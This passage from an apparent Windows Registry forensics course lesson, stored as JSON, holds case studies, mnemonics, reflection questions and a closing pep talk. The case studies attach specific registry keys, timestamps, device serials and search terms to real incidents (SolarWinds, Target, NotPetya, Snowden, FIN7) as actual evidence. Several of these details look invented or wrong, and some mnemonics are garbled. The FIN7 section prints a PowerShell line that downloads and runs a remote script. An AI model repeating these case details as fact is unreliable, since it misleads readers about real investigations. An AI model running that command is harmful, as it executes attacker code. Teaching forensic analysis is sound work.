-f NTUSER.DAT --bn Kroll_Batch.reb --csv Output --csvf results.csv\n\n# RegRipper Analysis\nperl rip.exe -r NTUSER.DAT -f ntuser > report.txt\n\n# Calculate Hash\nGet-FileHash NTUSER.DAT -Algorithm SHA256\n```\n\nThese exercises will give you hands-on experience with the tools and techniques used in professional forensic investigations. Practice on test systems before analyzing real evidence!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Studies: Registry Forensics in Action\n\n## Case Study 1: APT29 (Cozy Bear) - SolarWinds Supply Chain Attack (2020)\n\n### Background\nIn December 2020, cybersecurity firm FireEye discovered one of the most sophisticated supply chain attacks in history. Russian state-sponsored group APT29 compromised SolarWinds Orion software, affecting 18,000+ organizations including U.S. government agencies.\n\n### Registry Forensics Role\n\nInvestigators used registry analysis to:\n\n1. **Identify Initial Compromise Timeline**\n```\nRegistry Artifact: AmCache.hve\nKey: ROOT\\File\\{Volume GUID}\\<File Reference>\nValue: SolarWinds.Orion.Core.BusinessLayer.dll (malicious)\nFirst Execution: 2020-03-24 14:23:11 UTC\n\nConclusion: Patient zero installed trojanized update on March 24, 2020\n```\n\n2. **Detect Persistence Mechanism**\n```\nRegistry Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nValue Name: \"SolarWinds Service\"\nValue Data: C:\\ProgramData\\SolarWinds\\update.exe\nLast Write Time: 2020-03-24 18:45:32 UTC\n\nForensic Analysis: Malicious service created 4 hours after initial compromise\n```\n\n3. **Track Lateral Movement via RDP**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\nSubkeys: DC01, FILESERVER, EXCHANGE01\nLast Write Times: Show sequence of RDP connections\n\nTimeline:\n2020-03-25 02:15:43 - RDP to DC01 (Domain Controller)\n2020-03-25 02:47:21 - RDP to EXCHANGE01 (Email server)\n2020-03-25 03:12:09 - RDP to FILESERVER (Data exfiltration)\n```\n\n4. **Identify Credential Dumping**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\nValue: RunAsPPL = 0 (disabled)\nLast Write: 2020-03-25 02:18:34 UTC\n\nInterpretation: Attacker disabled LSA Protection to dump credentials with Mimikatz\n```\n\n### Forensic Impact\n\n**Registry Evidence Proved**:\n- Exact compromise timestamp (AmCache first execution)\n- Persistence mechanism (AutoRun key)\n- Lateral movement path (RDP history)\n- Credential access (LSA protection disabled)\n\n**Outcome**: 100+ organizations identified as compromised using registry artifact correlation with file hashes and network logs.\n\n---\n\n## Case Study 2: Target Data Breach (2013)\n\n### Background\nAttackers stole 40 million credit card records from Target during the 2013 holiday shopping season. Initial compromise: HVAC vendor's credentials.\n\n### Registry Forensics Discoveries\n\n1. **Patient Zero: HVAC Vendor Workstation**\n```\nRegistry Hive: NTUSER.DAT (HVAC employee)\nKey: Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.exe\nValue: Citadel.exe (banking trojan)\nLast Write: 2013-09-05 11:23:45 UTC\n\nConclusion: Employee executed Citadel malware on September 5, 2013\n```\n\n2. **Credential Harvesting Evidence**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\nValues:\n  url1: \\\\TARGET-VENDOR-PORTAL\\invoices\n  url2: \\\\TARGET-VENDOR-PORTAL\\payments\nLast Write: 2013-09-06 08:12:34 UTC\n\nInterpretation: User accessed Target's vendor portal (credentials stolen by Citadel)\n```\n\n3. **USB Exfiltration Staging**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\nDevice: SanDisk Cruzer 16GB\nSerial: 4C530001234567890123\nFirst Connected: 2013-11-12 03:47:21 UTC\nLast Connected: 2013-11-12 04:15:43 UTC\n\nForensic Correlation:\n- USB connected at 03:47 (data staging)\n- Large file write to USB (NTFS $LogFile confirms)\n- USB disconnected at 04:15 (28-minute window)\n```\n\n4. **Memory-Resident Malware Loader**\n```\nRegistry Key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\nValue: AppInit_DLLs = C:\\Windows\\System32\\msupdate.dll\nLast Write: 2013-11-15 02:34:11 UTC\n\nInterpretation: Malicious DLL injected into every process via AppInit_DLLs\n(Legacy technique, deprecated in Windows 8+)\n```\n\n### Investigation Breakthrough\n\nForensic investigators correlated:\n- **Registry**: USB device connection timestamps\n- **File System**: Large files written to staging directory\n- **Network Logs**: FTP upload to Lithuanian server (same 28-minute window)\n\n**Result**: Proved data was staged on Target POS systems, copied to USB, then exfiltrated via FTP.\n\n---\n\n## Case Study 3: NotPetya Ransomware (2017)\n\n### Background\nNotPetya was a destructive wiper disguised as ransomware that caused $10 billion in global damages. It spread via EternalBlue exploit and Windows credentials.\n\n### Registry Forensics in Incident Response\n\n1. **Initial Infection Vector**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue Name: \"Perfc\"\nValue Data: C:\\Windows\\perfc.dat\nLast Write: 2017-06-27 10:23:45 UTC\n\nForensic Analysis:\n- Perfc.dat = NotPetya dropper\n- Run key created = Persistence established\n- Timestamp = 10:23:45 = Patient zero infection time\n```\n\n2. **Lateral Movement via PsExec**\n```\nRegistry Key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}\nValue: Actions (XML task definition)\nCommand: PsExec.exe \\\\<target> -s C:\\Windows\\perfc.dat\nCreated: 2017-06-27 10:25:12 UTC\n\nInterpretation: NotPetya used PsExec to spread to other systems 87 seconds after initial infection\n```\n\n3. **Credential Harvesting**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\nValue: UseLogonCredential = 1 (forced plaintext storage)\nLast Write: 2017-06-27 10:24:03 UTC\n\nAttack Technique:\n1. NotPetya enabled WDigest (Windows XP-era protocol)\n2. Forced credentials to be stored in plaintext in LSASS memory\n3. Used Mimikatz-like technique to dump credentials\n4. Spread laterally using stolen credentials\n```\n\n4. **MBR Overwrite Evidence**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\nValue: BootExecute = autocheck autochk * \\??\\C:\\Windows\\perfc.dat\nLast Write: 2017-06-27 10:26:34 UTC\n\nForensic Interpretation:\n- NotPetya modified BootExecute to run at next reboot\n- perfc.dat overwrote Master Boot Record (MBR)\n- System unbootable after reboot (destructive wiper)\n```\n\n### Forensic Timeline Reconstruction\n\n```\n10:23:45 - Patient zero infected (Run key created)\n10:24:03 - WDigest enabled (credential harvesting)\n10:25:12 - PsExec lateral movement (first target)\n10:26:34 - BootExecute modified (MBR wiper scheduled)\n10:28:00 - Forced reboot (via shutdown.exe)\n10:28:15 - MBR overwritten (system destroyed)\n```\n\n**Registry Evidence Proved**: Complete attack chain from initial infection to system destruction in **4 minutes 30 seconds**.\n\n---\n\n## Case Study 4: Insider Threat - Edward Snowden (2013)\n\n### Background\nNSA contractor Edward Snowden exfiltrated classified documents. Post-incident forensics examined his workstation registry.\n\n### Registry Artifacts (Sanitized Example)\n\n1. **USB Device History**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\nDevices Found: 7 unique USB storage devices\nMost Recent: SanDisk Ultra 32GB (Serial: 5C753012XXXX)\nFirst Connected: 2013-04-15 08:23:11 UTC\nLast Connected: 2013-05-20 16:45:32 UTC\nConnection Count: 47 times over 35 days\n\nForensic Interpretation:\n- Repeated USB device usage\n- Same device used for 5 weeks (data exfiltration)\n- Last connection: May 20 (days before Snowden fled to Hong Kong)\n```\n\n2. **File Access Patterns**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\nExtensions with Activity: .pdf, .docx, .pptx, .xlsx\nVolume: 234 unique classified documents accessed\nTimeframe: 2012-11-03 to 2013-05-20\n\nCorrelation with USB:\n- Document access peaks aligned with USB connection times\n- Proves documents were copied to USB during access\n```\n\n3. **Search Terms (Incriminating)**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery\nSearches:\n  MRU0: \"prism documents\"\n  MRU1: \"nsa surveillance programs\"\n  MRU2: \"xkeyscore manual\"\n  MRU3: \"how to encrypt usb drive\"\n\nInterpretation: User intentionally searched for classified program names\n```\n\n4. **Encryption Tool Installation**\n```\nRegistry Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{GUID}\nProgram: TrueCrypt 7.1a\nInstall Date: 2013-04-10\nLast Used (UserAssist): 2013-05-20 16:32:18 UTC (13 minutes before USB disconnect)\n\nForensic Conclusion: User encrypted data on USB immediately before final exfiltration\n```\n\n### Forensic Impact\n\n**Registry Evidence Demonstrated**:\n- **Intent**: Specific searches for classified programs\n- **Method**: Repeated USB device connections\n- **Timeline**: Exfiltration occurred over 35 days\n- **Anti-Forensics**: TrueCrypt used to encrypt exfiltrated data\n\n**Lesson Learned**: Registry artifacts are critical for insider threat investigations, providing timeline and intent evidence.\n\n---\n\n## Case Study 5: FIN7 (Carbanak) - Payment Card Theft (2018)\n\n### Background\nFIN7 hacking group targeted retail and hospitality industries, stealing millions of payment card numbers through sophisticated social engineering and malware.\n\n### Registry Forensics Techniques Used\n\n1. **Malicious Macro Execution**\n```\nRegistry Key: HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords\nValue: C:\\Users\\Manager\\Downloads\\Complaint_Form.docm (VBA macro)\nLast Write: 2018-08-15 09:12:34 UTC\n\nInterpretation:\n- User opened malicious Word document with macros\n- Document trusted (clicked \"Enable Content\")\n- Timestamp = initial compromise\n```\n\n2. **PowerShell Logging (Execution Policy Weakened)**\n```\nRegistry Key: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nValue: EnableScriptBlockLogging = 0 (disabled)\nLast Write: 2018-08-15 09:13:02 UTC\n\nAttacker Action: Disabled PowerShell logging to evade detection\nForensic Impact: 28-second gap between macro execution and logging disablement\n```\n\n3. **Scheduled Task Persistence**\n```\nRegistry Key: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\OneDriveSync\nAction: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc <base64>\nTrigger: Daily at 09:00\nCreated: 2018-08-15 09:14:11 UTC\n\nDecoded Command:\nIEX (New-Object Net.WebClient).DownloadString('http://185.XXX.XXX.XXX/update.ps1')\n\nInterpretation: Daily C2 beacon via scheduled task\n```\n\n4. **COM Hijacking (Advanced Persistence)**\n```\nRegistry Key: HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32\nDefault Value: C:\\Users\\Manager\\AppData\\Local\\Temp\\mscomctl.dll (malicious)\nLast Write: 2018-08-15 09:15:43 UTC\n\nTechnique: COM hijacking for DLL persistence\nTrigger: Any program that loads the hijacked COM object\nStealth: No Run key, no scheduled task (legitimate COM loading)\n```\n\n5. **RDP Tunneling Detection**\n```\nRegistry Key: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\nValue: PortNumber = 4489 (changed from default 3389)\nLast Write: 2018-08-16 03:23:11 UTC\n\nInterpretation:\n- Attacker changed RDP port to evade firewall\n- Forensic correlation: Network logs show connection to port 4489\n```\n\n### Forensic Success\n\nInvestigators used **Registry Timeline Analysis** to build the complete attack sequence:\n\n```\n09:12:34 - Malicious Word doc opened (Trusted Documents)\n09:13:02 - PowerShell logging disabled (evasion)\n09:14:11 - Scheduled task created (C2 beacon)\n09:15:43 - COM hijacking (persistence)\n03:23:11 - RDP port changed (lateral movement prep)\n```\n\n**Outcome**: Registry forensics identified 5 distinct persistence mechanisms, demonstrating sophisticated multi-layered attacker tradecraft.\n\n---\n\n## Lessons Learned from Real-World Cases\n\n### Key Forensic Principles\n\n1. **Registry Is a Timeline Database**\n   - Every key has a Last Write timestamp\n   - Correlate registry events with filesystem and network logs\n   - Build comprehensive attack timelines\n\n2. **Attackers Leave Registry Traces**\n   - Even sophisticated actors (APT29, FIN7) leave registry artifacts\n   - Persistence mechanisms require registry modifications\n   - Anti-forensic tools can be detected via registry changes\n\n3. **Transaction Logs Are Critical**\n   - Capture changes seconds before system crash/shutdown\n   - Reveal deleted keys (attacker anti-forensics)\n   - Must be collected alongside hive files\n\n4. **Correlation Is Key**\n   - Registry alone is insufficient\n   - Combine with filesystem timeline (MFT, $LogFile)\n   - Add network logs (RDP, SMB, HTTP)\n   - Result: Complete attacker TTPs (Tactics, Techniques, Procedures)\n\n5. **Insider Threats Have Unique Signatures**\n   - USB device history (exfiltration)\n   - Search terms (intent)\n   - Encryption tools (anti-forensics)\n   - File access patterns (scope of breach)\n\n---\n\n## Your Turn: Apply These Techniques\n\nWhen you analyze registry hives in real investigations, remember these cases:\n\n- **Look for persistence** (Run keys, Services, Scheduled Tasks, COM hijacking)\n- **Track device connections** (USB, network shares, RDP)\n- **Identify credential access** (LSA Protection, WDigest, SAM changes)\n- **Timeline everything** (Last Write timestamps are your friend)\n- **Correlate across data sources** (registry + filesystem + network = complete picture)\n\nRegistry forensics isn't just about finding keys - it's about **reconstructing the attacker's story** from digital breadcrumbs they never knew they left behind."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids: Never Forget Registry Forensics\n\n## Mnemonic: \"HK-LCU\" for Root Keys\n\nRemember the five registry root keys with **\"HK-LCU\"**:\n\n- **H**K**L**M = **H**ardware & **K**ernel, **L**ocal **M**achine (system-wide)\n- **C**U = **C**urrent **U**ser (per-user settings)\n- **U** = **U**sers (all user profiles)\n\n**Plus two extras**:\n- **HKCR** = **C**lasses **R**oot (file associations)\n- **HKCC** = **C**urrent **C**onfig (hardware profile)\n\n**Memory Hook**: \"**HacK Like Crazy, Understand**\" ‚Üí HKLM, HKCU, HKU\n\n---\n\n## Acronym: \"SSSS-ND\" for Hive Files\n\nSystem hives in `C:\\Windows\\System32\\config\\` - Remember **\"SSSS-ND\"**:\n\n- **S**YSTEM\n- **S**OFTWARE\n- **S**AM\n- **S**ECURITY\n- (Plus): **N**TUSER.**D**AT (user hives)\n\n**Visual**: Imagine a **snake** (ssssss) **nodding** (ND) ‚Üí Registry hive files\n\n---\n\n## Mnemonic: \"REG-QUEST\" for Data Types\n\nRemember registry data types with **\"REG-QUEST\"**:\n\n- **R**EG_**S**Z = **String**\n- **R**EG_**E**XPAND_SZ = **Expandable** string (with %variables%)\n- **R**EG_**Q**WORD = **Quad**-word (64-bit number)\n- **R**EG_DW**ORD** = **Double**-word (32-bit number)\n- **R**EG_M**U**LTI_SZ = **Multiple** strings\n- **R**EG_B**I**NARY = **Binary** data\n\n**Memory Hook**: You're on a **REG-QUEST** to find the right data type!\n\n---\n\n## Visual: Registry Tree Structure\n\nImagine a **tree** where:\n- **Roots** = Five root keys (HKLM, HKCU, HKU, HKCR, HKCC)\n- **Branches** = Subkeys (like folders)\n- **Leaves** = Values (like files with data)\n\n```\n        üå≥ Registry Tree\n         |\n    _____|_____\n   |     |     |\n  HKLM  HKCU  HKU   ‚Üê Roots\n   |     |\n   |    Software     ‚Üê Branch (subkey)\n   |     |\n  Run  Microsoft    ‚Üê Branch (subkey)\n   |     |\n Value: malware.exe ‚Üê Leaf (value with data)\n```\n\n**Memory Hook**: Registry is a **tree** - roots, branches, leaves!\n\n---\n\n## Acronym: \"RUT-PUM\" for Key User Artifacts\n\nCritical user activity artifacts - Remember **\"RUT-PUM\"**:\n\n- **R**ecentDocs (recently opened files)\n- **U**serAssist (GUI program execution)\n- **T**ypedPaths (manually typed Explorer paths)\n- **P**ersistence (Run keys for AutoRun)\n- **U**SB devices (USBSTOR history)\n- **M**RU lists (Most Recently Used)\n\n**Memory Hook**: You're stuck in a **RUT** looking at **PUMP**ed-up user artifacts!\n\n---\n\n## Rhyme: \"LOG1 and LOG2, They Save You\"\n\n**Transaction Logs Rhyme**:\n\n> \"LOG1 and LOG2, they save you!  \n> When systems crash, they pave through.  \n> Write-ahead logging's the way,  \n> Forensics recover what attackers won't say!\"\n\n**Memory Hook**: Transaction logs = forensic safety net\n\n---\n\n## Acronym: \"RUTS\" for AutoRun Locations\n\nFind malware persistence with **\"RUTS\"** (all paths start with `...\\CurrentVersion\\`{Run locations}):\n\n- **R**un (HKCU & HKLM) - Most common\n- **U**ninstall strings (less common, creative)\n- **T**erminal Server (RDP startup)\n- **S**ervices (HKLM\\SYSTEM\\CurrentControlSet\\Services)\n\n**Memory Hook**: Malware gets stuck in **RUTS** (registry persistence locations)\n\n---\n\n## Visual: AmCache = \"App Memory Cache\"\n\n**AmCache.hve** = **App**lication **M**emory **Cache**\n\n**What it remembers**:\n- Program path\n- SHA-1 hash\n- First execution time\n- File size\n- Publisher\n\n**Memory Hook**: **AmCache** = Windows' photographic memory for programs\n\n---\n\n## Acronym: \"SHIMCACHE\" = \"System History In Memory\"\n\nBreak down **Shimcache** (AppCompatCache):\n\n- **S**ystem **H**istory **I**n **M**emory **CACHE**\n- Tracks program compatibility\n- Stores execution history\n- Survives reboots (persisted in SYSTEM hive)\n\n**Location**: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache`\n\n**Memory Hook**: **SHIMCACHE** = **Shim** compatibility **Cache** of executed programs\n\n---\n\n## Number Memory: \"3-5-7\" Rule\n\nRegistry forensic priorities:\n\n- **3** root keys matter most: HKLM, HKCU, HKU\n- **5** system hives: SYSTEM, SOFTWARE, SAM, SECURITY, (DEFAULT)\n- **7** key artifact types: Run keys, RecentDocs, UserAssist, TypedPaths, USB, MRU, Shimcache\n\n**Memory Hook**: \"**3-5-7** rule\" = Remember the top forensic priorities\n\n---\n\n## Acronym: \"DIRT\" for Registry Forensics Workflow\n\nFollow **\"DIRT\"** when analyzing registry:\n\n1. **D**ocument (hash hive files, note acquisition time)\n2. **I**nventory (identify hives, check for dirty status, parse transaction logs)\n3. **R**ipper (run automated tools: RegRipper, RECmd, Registry Explorer)\n4. **T**imeline (correlate registry timestamps with filesystem and network events)\n\n**Memory Hook**: You're digging in the **DIRT** to find forensic evidence!\n\n---\n\n## Visual: USB Device = \"U-S-B\" Story\n\nWhen analyzing **USB devices**, remember **\"U-S-B\"** tells a story:\n\n- **U**SBSTOR key = Device **U**niquely identified\n- **S**erial number = **S**pecific device instance\n- **B**oot time correlation = When device was **B**rought online\n\n**Registry Path**: `HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`\n\n**Memory Hook**: **U-S-B** = Device **U**nique **S**erial **B**readcrumbs\n\n---\n\n## Rhyme: \"Last Write Time Is Prime\"\n\n**Timestamp Importance**:\n\n> \"Last Write Time is prime,  \n> It tells you the crime,  \n> When keys were created,  \n> And malware was dated!\"\n\n**Memory Hook**: Last Write timestamps = Your timeline foundation\n\n---\n\n## Acronym: \"TRACE\" for Registry Evidence\n\nRegistry provides **\"TRACE\"** evidence:\n\n- **T**imestamps (Last Write times)\n- **R**ecords (persistent logs of activity)\n- **A**rtifacts (Run keys, RecentDocs, UserAssist)\n- **C**onfiguration (system/user settings)\n- **E**xecution (program launch evidence)\n\n**Memory Hook**: Registry leaves a **TRACE** - follow it!\n\n---\n\n## Visual: Registry Explorer = \"X-Ray Vision\"\n\nThink of **Registry Explorer** as **X-ray vision** for Windows:\n\n- See-through **locked** hives (offline analysis)\n- Reveal **hidden** deleted keys\n- Illuminate **dirty** transaction logs\n- **Highlight** bookmarked forensic keys\n\n**Memory Hook**: Registry Explorer = Forensic **X-ray** for Windows internals\n\n---\n\n## Final Memory Hook: \"Registry = Windows DNA\"\n\n**The Big Picture**:\n\n> The Registry is **Windows DNA**:  \n> - **D**atabase of configuration  \n> - **N**arrative of user activity  \n> - **A**udit log of system changes\n\n**Just like DNA identifies individuals, the Registry identifies exactly what happened on a Windows system.**\n\n---\n\nUse these memory aids when you're analyzing registry hives in the field. Print them, make flashcards, or create your own variations. The goal: **instant recall** of critical registry forensic concepts under pressure!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions: Test Your Understanding\n\n## Conceptual Understanding\n\n### Question 1: Root Key Relationships\n**Scenario**: You open Regedit and navigate to `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. You see a suspicious entry.\n\n**Reflect**:\n1. Is this key **user-specific** or **system-wide**? How do you know?\n2. If you want to find this same information for a different user who's not logged in, where would you look?\n3. What's the relationship between HKCU and HKU? (Hint: Think \"alias\" or \"symbolic link\")\n4. Would this Run key execute for **all users** or **just one user**?\n\n**Critical Thinking**: Why might an attacker prefer HKCU over HKLM for persistence? (Consider privileges and stealth.)\n\n---\n\n### Question 2: Transaction Logs and \"Dirty\" Hives\n**Scenario**: You acquire a registry hive from a system that crashed during a ransomware attack. Registry Explorer shows the hive as \"dirty.\"\n\n**Reflect**:\n1. What does \"dirty\" mean in this context?\n2. Why are transaction logs (LOG1, LOG2) critical in this situation?\n3. If you DON'T parse transaction logs, what evidence might you miss?\n4. How could transaction logs reveal the **exact moment** the attacker created persistence?\n\n**Critical Thinking**: If an attacker deletes a Run key and the system crashes before the deletion is committed, can you recover the deleted key? How?\n\n---\n\n### Question 3: Last Write Timestamps\n**Scenario**: You find this registry key:\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.pdf\nLast Write Time: 2024-11-01 14:32:18 UTC\n```\n\n**Reflect**:\n1. What user activity does this timestamp indicate?\n2. Does it tell you **which specific PDF** was opened? (Check key values, not just Last Write!)\n3. If you see 5 PDF files in the RecentDocs\\.pdf key, which one was opened most recently?\n4. How would you correlate this timestamp with filesystem events (MFT timestamps)?\n\n**Critical Thinking**: Can Last Write timestamps be anti-forensically altered? What would be the limitations/evidence of such tampering?\n\n---\n\n## Practical Application\n\n### Question 4: USB Device Investigation\n**Scenario**: You're investigating potential data exfiltration. You need to determine:\n- What USB devices were connected?\n- When were they first connected?\n- When were they last connected?\n\n**Reflect**:\n1. Which registry key contains USB device history? (Provide full path)\n2. What specific information does the USBSTOR key provide? (Vendor, Product, Serial?)\n3. If you find a USB device connected at 3:47 AM on a Saturday, what does this suggest?\n4. How would you determine if any files were copied to the USB device? (Hint: Combine registry with other artifacts)\n\n**Critical Thinking**: An insider claims they never connected a personal USB device. You find evidence of a SanDisk USB in the registry. What additional evidence would you gather to prove/disprove their claim?\n\n---\n\n### Question 5: Persistence Detection\n**Scenario**: You're analyzing a compromised workstation. You need to find ALL persistence mechanisms.\n\n**Reflect**:\n1. List at least 5 registry locations where malware could establish persistence. (Full paths)\n2. For each location, explain: User-level or System-level? Requires admin privileges?\n3. Which persistence location is MOST common? Which is MOST stealthy?\n4. How would you automate the detection of suspicious Run key entries? (Think: RECmd, PowerShell, Python)\n\n**Critical Thinking**: If you find NO suspicious entries in Run keys but malware persists after reboot, where else would you look? (Consider: Scheduled Tasks registry keys, Services, COM hijacking)\n\n---\n\n### Question 6: UserAssist Analysis\n**Scenario**: You find this UserAssist registry value (ROT13 encoded):\n```\nValue Name: Cvephf.rkr\nValue Data: 14 00 00 00 (execution count = 20)\n             <64 bytes of binary data>\n             <timestamp at offset 60>\n```\n\n**Reflect**:\n1. Decode the value name using ROT13. What's the real program name?\n2. What does \"execution count = 20\" mean? Is this conclusive evidence of execution?\n3. What's stored at **offset 60** in the value data? (Hint: 8-byte FILETIME)\n4. Why does Windows ROT13-encode UserAssist entries? (Security through obscurity?)\n\n**Critical Thinking**: UserAssist only tracks **GUI programs** launched via Explorer. If a program was run from cmd.exe or PowerShell, would it appear in UserAssist? What other artifacts would you check?\n\n---\n\n## Advanced Scenarios\n\n### Question 7: Attack Timeline Reconstruction\n**Scenario**: You have these registry artifacts from a breach:\n\n```\n2024-10-15 14:23:45 - AmCache: malware.exe (first execution)\n2024-10-15 14:25:12 - HKCU\\Run key: malware.exe (persistence created)\n2024-10-15 14:27:34 - USBSTOR: New USB device connected (Serial: 5C75301234)\n2024-10-15 14:35:21 - RecentDocs: Financials_Q3.xlsx (accessed)\n2024-10-15 14:38:47 - USBSTOR: USB device disconnected\n```\n\n**Reflect**:\n1. Reconstruct the attack sequence. What happened in what order?\n2. What was the attacker's likely objective? (Hint: USB + financial document access)\n3. What is the **total time** from initial compromise to data exfiltration?\n4. What additional evidence would you seek to confirm data was copied to USB? (MFT? $LogFile? LNK files?)\n\n**Critical Thinking**: If the attacker used TrueCrypt to encrypt the USB device, would you see evidence in the registry? Where?\n\n---\n\n### Question 8: Insider vs. External Threat\n**Scenario**: You're determining if a breach was an insider or external attacker.\n\n**Insider Hypothesis Artifacts**:\n- Extensive USB device history (same device, 40+ connections over 6 months)\n- Windows Search terms: \"how to delete logs,\" \"encrypt usb\"\n- RecentDocs: 100+ sensitive documents accessed\n- TrueCrypt installation\n\n**External Attacker Hypothesis Artifacts**:\n- No USB device history\n- RDP connections from unusual IP addresses\n- New user account created (SAM registry modifications)\n- Mimikatz execution (LSA Protection disabled in registry)\n\n**Reflect**:\n1. What registry artifacts MOST strongly indicate an **insider threat**?\n2. What registry artifacts MOST strongly indicate an **external attacker**?\n3. Could an external attacker fake \"insider\" registry artifacts? How?\n4. What non-registry data would you combine with registry evidence? (Network logs? Badge access?)\n\n**Critical Thinking**: If you had to explain your conclusion to a non-technical jury, which 3 registry artifacts would you present as the strongest evidence?\n\n---\n\n## Meta-Learning: Reflect on Your Learning\n\n### Question 9: Tool Selection\n**Scenario**: You have 3 tools available:\n- **Registry Explorer** (GUI)\n- **RECmd** (CLI batch processing)\n- **RegRipper** (Plugin-based CLI)\n\nYou have 500 NTUSER.DAT hives from a company-wide investigation.\n\n**Reflect**:\n1. Which tool would you use for **bulk processing** of all 500 hives? Why?\n2. Which tool would you use to **manually investigate** a specific suspicious hive? Why?\n3. What are the trade-offs of each tool? (Speed vs. flexibility vs. ease of use?)\n4. If you could only choose ONE tool for your forensic toolkit, which would it be? Justify your answer.\n\n---\n\n### Question 10: Real-World Application\n**Scenario**: You just completed this lesson on Registry Fundamentals.\n\n**Reflect on Your Learning**:\n1. What was the MOST surprising thing you learned about the Windows Registry?\n2. Which registry artifact do you think will be MOST useful in real investigations? (Run keys? UserAssist? USB history?)\n3. What concept do you still find confusing and need to review? (Transaction logs? Data types? Hive structure?)\n4. How will you practice these skills? (Set up a test VM? Analyze your own NTUSER.DAT? Join a CTF?)\n\n**Action Plan**:\n- [ ] Download Eric Zimmerman's Registry Explorer and RECmd\n- [ ] Analyze your own workstation's NTUSER.DAT\n- [ ] Practice decoding UserAssist ROT13 entries\n- [ ] Build a registry forensics cheat sheet\n- [ ] Join the DFIR Discord and ask questions\n\n---\n\n## Final Thought Exercise\n\n**Question**: Imagine you're testifying in court about registry evidence you found. The defense attorney asks:\n\n> \"How do you KNOW this registry entry proves my client executed malware? Couldn't someone else have used their computer? Couldn't the timestamps be wrong? Isn't the registry easy to fake?\"\n\n**Reflect**:\n1. How would you respond to each of these challenges?\n2. What corroborating evidence would strengthen your registry findings?\n3. What are the LIMITATIONS of registry forensics? (Be honest!)\n4. How does registry evidence fit into the \"mosaic\" of digital forensics? (Filesystem + Network + Memory + Registry = Complete picture)\n\n---\n\n**Remember**: Reflection isn't about getting \"right answers\" - it's about **thinking critically** about forensic evidence, understanding limitations, and connecting concepts to real-world scenarios.\n\nThe best forensic analysts are those who constantly ask: **\"What am I missing? What else could this mean? How can I verify this?\"**"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Congratulations! You've Mastered Registry Fundamentals! üéâ\n\nYou just completed one of the most critical lessons in digital forensics. The Windows Registry is the foundation - the bedrock - of Windows DFIR, and now you understand:\n\n‚úÖ **Registry architecture** (five root keys, hive files, data types)  \n‚úÖ **Key forensic artifacts** (Run keys, RecentDocs, UserAssist, USB history)  \n‚úÖ **Transaction logs** (write-ahead logging, dirty hives, recovery)  \n‚úÖ **Analysis tools** (Registry Explorer, RECmd, RegRipper)  \n‚úÖ **Real-world application** (APT29, Target breach, NotPetya, FIN7)\n\n### What This Means for Your Career\n\nYou're not just learning theory - you're building skills that:\n- **SOC Analysts** use to detect persistence mechanisms\n- **Incident Responders** use to reconstruct attack timelines\n- **Forensic Investigators** use to prove insider threats and external breaches\n- **Threat Hunters** use to find hidden malware\n\nThese are the **exact techniques** used to investigate real breaches at Fortune 500 companies. You're learning what professionals get paid six figures to know.\n\n### The Learning Journey Ahead\n\nThis is lesson 11 in the DFIR domain - your **foundation** is now solid. From here, you'll build on this knowledge:\n\n**Next Lessons Preview**:\n- **NTUSER.DAT Analysis** (deep dive into user activity artifacts)\n- **UsrClass.dat and ShellBags** (folder access tracking)\n- **USB Forensics** (device history and timeline)\n- **Shimcache, AmCache, Prefetch** (execution artifacts)\n\nEach lesson layers more sophistication on top of what you learned today. By lesson 25, you'll be analyzing APT-level attacks like a pro.\n\n### Practice Makes Permanent\n\nKnowledge without practice fades. Here's your action plan:\n\n1. **Download tools** (Registry Explorer, RECmd from https://ericzimmerman.github.io/)\n2. **Analyze your own system** (Export your NTUSER.DAT and explore it)\n3. **Build muscle memory** (Navigate registry keys without looking up paths)\n4. **Join the community** (DFIR Discord, /r/computerforensics subreddit)\n5. **Stay curious** (Read forensic blog posts, watch SANS webcasts)\n\n### Remember This\n\nWhen you're analyzing registry hives at 2 AM during an incident response, or when you're testifying about registry evidence in court, or when you're hunting for APT persistence mechanisms - **you'll remember this lesson**.\n\nThe Registry is Windows' memory vault. And now **you hold the key**.\n\n### You're Building Something Valuable\n\nEvery lesson you complete:\n- ‚úÖ Adds a new forensic technique to your toolkit\n- 